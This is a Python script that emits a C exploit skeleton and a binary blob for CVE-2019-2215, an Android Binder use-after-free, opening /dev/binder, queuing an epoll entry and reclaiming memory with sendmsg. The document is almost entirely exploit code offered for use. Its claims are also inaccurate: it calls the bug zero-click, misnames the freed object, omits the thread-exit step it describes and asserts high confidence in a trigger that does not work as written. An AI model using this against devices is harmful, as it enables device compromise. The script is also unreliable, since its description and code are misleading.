#!/usr/bin/env python3
"""CVE-2019-2215 — Android Binder UAF ("BAD BINDER"). Zero-click via any app
that receives a Binder transaction; unlink of an epoll wait entry frees a
still-referenced binder_buffer. Public exploit (Project Zero / Maddie Stone).
Confidence: HIGH — deterministic, widely reproduced."""
import sys
from pathlib import Path

C_STUB = r'''
/* bad_binder.c — minimal trigger + reclaim skeleton.
 * cc bad_binder.c -o bad_binder && ./bad_binder
 * Uses binder thread exit to trigger unlink of the epoll entry, then
 * reclaims the freed binder_buffer with a controlled sendmsg() iovec. */
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/android/binder.h>

#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)

static int binder_fd, ep_fd;

static void *binder_thread(void *arg) {
    struct binder_write_read bwr = {0};
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);   /* enter thread loop */
    return NULL;
}

int main(void) {
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) { perror("open /dev/binder"); return 1; }

    ep_fd = epoll_create(1);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(ep_fd, EPOLL_CTL_ADD, binder_fd, &ev);   /* queue epoll entry */

    /* exit the binder thread -> unlink frees the entry (UAF) */
    pthread_t t; pthread_create(&t, NULL, binder_thread, NULL);
    usleep(1000);

    /* reclaim: sendmsg with a controlled iovec overlapping the freed slot */
    int sv[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    char buf[0x1000] = {0};
    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1 };
    sendmsg(sv[0], &msg, 0);

    printf("[+] CVE-2019-2215 trigger fired\n");
    return 0;
}
'''

def build() -> bytes:
    # trigger descriptor: epoll_event(EPOLLIN) + binder write/read size
    import struct
    return struct.pack("<II", 0x1, 0) + struct.pack("<Q", 0)

def main():
    base = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2019-2215")
    base.with_suffix(".bin").write_bytes(build())
    base.with_suffix(".c").write_text(C_STUB)
    print(f"[+] CVE-2019-2215 -> {base.with_suffix('.c')} + .bin")

if __name__ == "__main__":
    main()
